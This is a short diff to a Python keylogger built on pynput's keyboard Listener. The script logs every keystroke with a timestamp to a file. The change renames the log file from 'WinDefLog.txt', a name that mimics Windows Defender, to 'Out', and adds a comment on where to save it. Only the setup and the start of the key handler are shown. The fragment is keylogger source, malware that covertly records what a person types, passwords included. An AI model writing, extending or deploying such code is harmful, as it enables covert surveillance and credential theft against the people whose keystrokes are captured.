@@ -2,9 +2,9 @@ import logging
 
 from pynput.keyboard import Listener
 
-log_dir = ''
+log_dir = '' # Add the directory where the file will be saved add it like this C:\\dir\\dir2\\dir3\\
 
-logging.basicConfig(filename=(log_dir + 'WinDefLog.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(log_dir + 'Out'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
 def on_press(key):
